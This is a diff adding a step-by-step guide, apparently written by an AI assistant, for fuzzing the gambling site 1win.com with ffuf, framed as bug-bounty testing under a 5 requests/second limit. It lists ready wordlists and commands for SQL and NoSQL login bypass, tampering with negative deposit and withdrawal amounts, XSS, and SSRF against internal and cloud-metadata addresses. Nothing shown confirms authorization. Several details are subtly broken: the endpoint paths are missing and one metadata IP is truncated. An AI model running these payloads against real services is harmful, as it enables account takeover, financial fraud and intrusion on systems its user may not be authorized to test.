@@ -1,0 +1,106 @@
+To fuzz these endpoints at scale while staying within the program's strict rate limits (maximum 5 requests per second), you must use ffuf with precise throttling flags.
+Here is how to set up your payload files, format the ffuf commands, and configure the limits to test each area on Ubuntu.
+------------------------------
+## 🛠️ Phase 0: Setup and Rate Limit Constraints
+First, open your Ubuntu terminal and create a folder to house your target payload files:
+
+mkdir -p ~/1win_fuzzing && cd ~/1win_fuzzing
+
+## The Mandatory FFUF Throttling Flags
+To ensure you do not get banned or violate the 5 requests/sec policy, every command below uses these exact flags:
+
+* -t 1: Restricts ffuf to exactly 1 execution thread.
+* -rate 5: Restricts the engine to send exactly 5 requests per second. [1] 
+
+------------------------------
+## 1️⃣ Area 1: Authentication & Account Management## Step 1: Create the Auth Bypass Payload File
+Save your SQLi and NoSQLi mutations into a local wordlist:
+
+cat << 'EOF' > auth_payloads.txt
+' OR '1'='1
+admin' -- -
+admin' #
+OR 1=1
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+EOF
+
+## Step 2: Execute FFUF against the Login Endpoint
+If the login endpoint uses standard form parameters, use this command to replace the username field with your payload (FUZZ):
+
+ffuf -w auth_payloads.txt -u https://1win.com -X POST -d "username=FUZZ&password=testpassword" -t 1 -rate 5 -fc 401,403
+
+
+* For JSON-based logins, use this syntax instead:
+
+ffuf -w auth_payloads.txt -u https://1win.com -X POST -H "Content-Type: application/json" -d '{"username": "FUZZ", "password": "testpassword"}' -t 1 -rate 5 -fc 401,403
+
+
+* Verification Filter (-fc 401,403): This hides normal authentication failures. Any output that returns an HTTP 200 or a different response size indicates a potential bypass. [2, 3] 
+
+------------------------------
+## 2️⃣ Area 2: Financial Operations## Step 1: Create the Financial Tampering Payload File
+Generate an anomaly list containing fractional, negative, and overflow limits:
+
+cat << 'EOF' > finance_payloads.txt
+0.01
+-100.00
+-0.01
+2147483648
+1e-5
+EOF
+
+## Step 2: Execute FFUF against Deposit/Withdrawal Endpoints
+Include your active test session cookies/headers using the -H flag so the server recognizes your account:
+
+ffuf -w finance_payloads.txt -u https://1win.com -X POST -H "Cookie: session=YOUR_SESSION_COOKIE" -H "Content-Type: application/json" -d '{"amount": FUZZ, "currency": "USD"}' -t 1 -rate 5 -fc 400
+
+
+* Verification Filter (-fc 400): This filters out standard "Bad Request" validation errors. If a request returns an HTTP 200 OK or updates your transaction history status, the backend is failing to validate boundaries.
+
+------------------------------
+## 3️⃣ Area 3: Casino & Betting Core Features## Step 1: Create the XSS Payload File
+Save your script breakers and contexts into an input file:
+
+cat << 'EOF' > xss_payloads.txt
+<img src=x onerror=alert(document.domain)>
+" onfocus="alert(document.domain)" autofocus="
+javascript:alert(1)
+\"><iframe src=\"javascript:alert(1)\"></iframe>
+EOF
+
+## Step 2: Fuzz Profile and Chat Parameters
+Fuzz input tracking points such as bet names, custom avatars, or profile registration configurations:
+
+ffuf -w xss_payloads.txt -u https://1win.com -X POST -H "Cookie: session=YOUR_SESSION_COOKIE" -d "nickname=FUZZ" -t 1 -rate 5 -fc 400
+
+
+* How to Verify: Load the target profile or chat page manually in your browser. Inspect the page source code (Ctrl + U) or check your developer console to see if the browser executed the HTML script elements natively without proper escaping. [4] 
+
+------------------------------
+## 4️⃣ Area 4: Infrastructure & Input Handling## Step 1: Create the SSRF Destination File
+Compile an IP and cloud configuration loopback list:
+
+cat << 'EOF' > ssrf_payloads.txt
+http://127.0.0.1:8080
+http://localhost:3000
+http://2130706433
+http://169.254.169
+EOF
+
+## Step 2: Fuzz Remote Fetching Fields
+If an application feature pulls an image file or references an outside endpoint by its URL path, target that parameter:
+
+ffuf -w ssrf_payloads.txt -u https://1win.com -X GET -H "Cookie: session=YOUR_SESSION_COOKIE" -t 1 -rate 5
+
+
+* How to Verify: Compare response times (-rt) or response sizes (-s). If calling an internal port (like 127.0.0.1:8080) changes response sizes compared to a dead port, the backend machine is attempting to route internal connections locally. [5] 
+
+------------------------------
+If you need help fine-tuning your wordlists or analyzing the results, let me know:
+
+* Do you want to learn how to use the -fl (filter lines) or -fs (filter size) flags in ffuf to clear out background noise from your results?
+* Which specific endpoint URL path from your proxy history are you preparing to fuzz first?
+
+
+
